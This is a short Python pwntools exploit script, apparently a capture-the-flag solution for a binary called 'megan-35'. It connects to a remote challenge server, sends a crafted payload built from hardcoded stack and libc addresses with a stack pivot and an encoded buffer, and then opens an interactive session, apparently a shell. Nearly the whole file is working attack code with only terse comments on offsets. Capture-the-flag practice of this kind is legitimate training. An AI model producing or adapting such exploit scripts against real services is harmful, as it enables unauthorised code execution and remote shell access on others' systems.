#!/usr/bin/python
from pwn import *

'''Leak environ using "%s" to get stack address. Used those offsets in final payload.'''

#p = process("./megan-35",env={"LD_PRELOAD":"./libc.so.6"})
p = remote("megan35.stillhackinganyway.nl", 3535)
raw_input()
# Magic = 0xf7e5a819
#buf = p32(0xffffde4c)
buf = p32(0xffffde6c - 0xc0)
buf += (p32(0xdeadbeef))*3
buf += p32(0xf7e9f060 - 0x4b720)
#buf += p32(0xf7e5a940)
buf += p32(0xdeadbeef)
buf += p32(0x80482d6)
buf += p32(0xdeadbeef)
buf += p32(0xdeadbeef)
# Overwrite de3c with address of our code (dc20). So stack pivoting kind of.
#buf += pad
#buf += "OdNvmHesSh31RZfqOdNvmHesSh31RZfqOdNvmHesSh31RZfqOdNvmHesSh31RZfqOdNvmHesSh31RZfqOdNvmHesSh31RZfqOdNvmHesSh31RZfqOdNvmHesSh31RZfqOdNvmHesSh31RZfqOdNvmHesSh31RZfq"
#buf += "OdNvmHesSh31RZfqOdNvmHesSh31RZfqOdNvkLy5"

#buf += "OdNvoHesShW1RZfyOdNvoHesShW1RZerRt=yOdNvkLy5"
# value = 0xffffde6c - 0x2dc is what we want to overwrite with.
#buf += "OdNvoHesShW1RZfyOdNvoHesShW1RZesTIbqoHesSgXV"
buf += "OdNvoHesShW1RZfyOdNvoHesShW1RZesSZ/woHesSgXV"
log.info("Length: " + str(len(buf)))
p.sendline(buf)

p.interactive()
